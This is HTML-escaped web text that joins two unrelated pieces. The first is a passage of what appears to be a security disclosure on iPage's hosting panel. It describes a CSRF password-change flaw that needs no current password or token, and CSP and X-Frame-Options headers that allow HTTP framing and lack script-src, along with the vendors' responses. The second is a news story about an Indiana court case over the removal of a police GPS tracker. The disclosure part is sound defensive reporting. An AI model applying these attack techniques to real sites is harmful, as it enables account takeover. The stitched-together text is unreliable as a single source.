&lt;p&gt;This vulnerability is due to a weird feature &lt;a href=&quot;https://www.websiteplanet.com/web-hosting/ipage/&quot; target=&quot;_blank&quot;&gt;iPage&lt;/a&gt; has in their Change Password page. iPage doesn’t require your old/current password to change your password, and there are no unique tokens associated with the request.&lt;/p&gt;
&lt;p&gt;This means any website can send a cross-origin request with a new password to iPage, with the victim’s username, and iPage will change their password to whatever the attacker likes.&lt;/p&gt;

&lt;h3&gt;&lt;strong&gt;2. Multiple Content Security Policy Bypass&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Severity&lt;/strong&gt;: Medium&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Impact:&lt;/strong&gt; This allows attackers to perform clickjacking attacks on any API responses of iPage, and to bypass the CSP with content and script-injection attacks.&lt;/p&gt;
&lt;p&gt;iPage uses Content-Security-Policy to protect its API endpoints, it is supposedly there to stop attackers from injecting content so they can’t execute malicious scripts, and only allow certain pages to frame the API response endpoint.&lt;/p&gt;
&lt;p&gt;It looks like this:&lt;/p&gt;
&lt;p&gt;Content-Security-Policy: frame-ancestors ‘self’  http://*.impress.ly  http://*.dragndropbuilder.com  https://*.weeblycloud.com  https://*.sitelock.com  https://*.mojomarketplace.com  http://*.ipage.com  http://*.yourhostingaccount.com  https://*.ecwid.com&lt;/p&gt;
&lt;p&gt;X-Frame-Options: SAMEORIGIN  ALLOW-FROM  http://*.impress.ly  http://*.dragndropbuilder.com  https://*.weeblycloud.com  https://*.sitelock.com  https://*.mojomarketplace.com  http://*.ipage.com  http://*.yourhostingaccount.com  https://*.ecwid.com&lt;/p&gt;
&lt;p&gt;As you can see, there are multiple key attributes and components missing:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;A. Man-In-The-Middle Attack in frame-ancestors&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;If you look carefully, you can see the frame-ancestors attribute allows multiple HTTP (unencrypted) pages to frame it. This means any local attacker in a Wi-Fi network or public internet can host an HTTP domain that spoofs the address, and iPage will allow its responses to be framed by it.&lt;/p&gt;
&lt;p&gt;Considering some browsers, such as Internet Explorer 11, don’t support CSP, they also have an X-Frame-Options header saying the same thing – but as you can see, this one also allows the same HTTP domains like http://*.impress.ly, http://*.ipage.com, and more.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;B. Complete Bypass Because of Missing Attributes&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As you can see, the CSP doesn’t have script-src or object-src tags, meaning any attacker who found any HTML injection endpoint will be able to execute cross-site scripting attacks.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Check out the video here:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;iframe src=&quot;https://www.youtube.com/embed/ppUIc__Bokg?rel=0&quot; width=&quot;100%&quot; height=&quot;360&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;allowfullscreen&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;The Aftermath&lt;/strong&gt;&lt;span id=&quot;The-Aftermath&quot;/&gt;&lt;/h2&gt;
&lt;p&gt;January 15, 2019&lt;/p&gt;
&lt;p&gt;Out of the five web hosts we tested, we found that all can be easily hacked. This means that no matter which hosting service you use, you should always be sure to take additional measures to enhance your website’s security. &lt;a href=&quot;https://www.idanbenor.co.il/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Idan Ben Or, SEO expert&lt;/a&gt; noted: “The main takeaway we see is that even the biggest web hosts suffer from aging infrastructure and a bug can easily be inserted to target the six-plus million domains covered by these providers. And because of this, hackers don’t need to some kind of intricate attack, they can walk right through the front door.”&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;Responses&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Dreamhost&lt;/strong&gt; was the first to respond to our report, saying:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;First, I’d like to thank you for notifying us of this exploit and vulnerability.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;I believe responsible disclosure and visibility into security flaws helps makes &lt;/em&gt;&lt;em&gt;the internet a safer place for everyone.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;We currently have a fix in production that should prevent leveraging CSRF from&lt;/em&gt; &lt;em&gt;our old panel.dreamhost.com/id/ submit forms and are making efforts to increase &lt;/em&gt;&lt;em&gt;security and sanitize inputs across the rest of our endpoints.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;We also received the following response from Endurance, who runs &lt;strong&gt;Bluehost, iPage, and HostGator:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;I wanted to… let you know that after an internal analysis of the vulnerabilities you shared, we’ve taken steps to address and patch the potential vulnerabilities you identified.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;It’s also important to note that during our process, Bluehost red-flagged our account and closed it down unceremoniously. No exact reason was given; however, since it was done after the hack was completed, we can only assume it is because they saw what we were doing. Good job, Bluehost… but a little too late.&lt;/p&gt;

<title>Indiana man charged with theft for removing police tracking device from car</title>

<description>&lt;div readability=&quot;9.9929577464789&quot;&gt;
&lt;p class=&quot;font--body font-copy color-gray-darkest ma-0 pad-bottom-md undefined&quot;&gt;“I’m not looking to make things easier for drug dealers,” Justice Mark Massa &lt;a href=&quot;https://mycourts.in.gov/arguments/default.aspx?&amp;amp;id=2421&amp;amp;view=detail&amp;amp;yr=&amp;amp;when=&amp;amp;page=1&amp;amp;court=&amp;amp;search=heuring&amp;amp;direction=%20ASC&amp;amp;future=True&amp;amp;sort=&amp;amp;judge=&amp;amp;county=&amp;amp;admin=False&amp;amp;pageSize=20&quot; target=&quot;_blank&quot;&gt;said during oral arguments&lt;/a&gt; Nov. 7. “But something is left on your car — even if you know it’s the police that are tracking you, you have an obligation to leave it there and let them track you?”&lt;/p&gt;
&lt;/div&gt;&lt;div readability=&quot;13&quot;&gt;
&lt;p class=&quot;font--body font-copy color-gray-darkest ma-0 pad-bottom-md undefined&quot;&gt;The case dates to July 11, 2018, when deputies in the southwest Indiana county applied for a warrant to track Heuring’s vehicle, believing he was using it to deal methamphetamine. A judge granted permission, and police placed the magnetic tracker on the vehicle July 13.&lt;/p&gt;
&lt;/div&gt;
&lt;div readability=&quot;12&quot;&gt;
&lt;p class=&quot;font--body font-copy color-gray-darkest ma-0 pad-bottom-md undefined&quot;&gt;The device signaled its location until July 20. Technicians said the battery remained fully charged, leading the deputies to investigate further. They conducted surveillance of Heuring’s home and his parents’ home. Spotting the SUV in a barn on the parents’ property, they thought perhaps the barn was interfering with the device’s reception.&lt;/p&gt;
&lt;/div&gt;
&lt;div readability=&quot;9&quot;&gt;
&lt;p class=&quot;font--body font-copy color-gray-darkest ma-0 pad-bottom-md undefined&quot;&gt;But by July 30, the vehicle was back at Heuring’s home and the tracker still wasn’t signaling its location. That’s when the deputies discovered that it was no longer attached to the Explorer.&lt;/p&gt;
&lt;/div&gt;


&lt;div readability=&quot;12&quot;&gt;
&lt;p class=&quot;font--body font-copy color-gray-darkest ma-0 pad-bottom-md undefined&quot;&gt;They sought warrants to search Heuring’s home and the barn, alleging that there was probable cause that a crime had been committed — that Heuring had committed theft by taking off the GPS tracker. While searching the barn, they found the tracker in a bathroom locker. They also found evidence of drug use: a glass pipe.&lt;/p&gt;
&lt;/div&gt;
&lt;div readability=&quot;12&quot;&gt;
&lt;p class=&quot;font--body font-copy color-gray-darkest ma-0 pad-bottom-md undefined&quot;&gt;A subsequent search, granted by a judge based on the paraphernalia, uncovered bags of methamphetamine, pills, digital scales and a gun. Heuring was charged with drug dealing and with theft.&lt;/p&gt;
&lt;/div&gt;
&lt;div readability=&quot;14&quot;&gt;
&lt;p class=&quot;font--body font-copy color-gray-darkest ma-0 pad-bottom-md undefined&quot;&gt;His lawyer, Michael Keating, is arguing that the search was illegal because there was not sufficient evidence that Heuring had committed a crime. The GPS device could have fallen off by mistake, he argued. Besides, Keating said, there was no indication that it belonged to law enforcement.&lt;/p&gt;
&lt;/div&gt;

&lt;div readability=&quot;9&quot;&gt;
&lt;p class=&quot;font--body font-copy color-gray-darkest ma-0 pad-bottom-md undefined&quot;&gt;During the Nov. 7 oral arguments, the Supreme Court justices expressed concern about what the case could mean for private use of surveillance devices.&lt;/p&gt;
&lt;/div&gt;

&lt;div readability=&quot;9&quot;&gt;
&lt;p class=&quot;font--body font-copy color-gray-darkest ma-0 pad-bottom-md undefined&quot;&gt;“What if it’s not the police’s tracker device?” asked Justice Geoffrey Slaughter. “What if instead it belongs to the jilted girlfriend or the nosy neighbor? Is it also theft if he removes that device from his vehicle?”&lt;/p&gt;
&lt;/div&gt;
&lt;div readability=&quot;13&quot;&gt;
&lt;p class=&quot;font--body font-copy color-gray-darkest ma-0 pad-bottom-md undefined&quot;&gt;Deputy Attorney General Jesse Drum argued that the deputies had not acted in bad faith and had done everything by the book, noting that they “sought judicial approval for every step of their investigation in this case.” He said trackers placed by the government under a warrant are distinct from those placed by private citizens. Removing a device from a car where it has a legal basis to be “deprives the police of its use,” he claimed, and constitutes a crime.&lt;/p&gt;
&lt;/div&gt;
&lt;div readability=&quot;8&quot;&gt;
&lt;p class=&quot;font--body font-copy color-gray-darkest ma-0 pad-bottom-md undefined&quot;&gt;The court is considering the case, with a ruling expected in the next few months.&lt;/p&gt;
&lt;/div&gt;
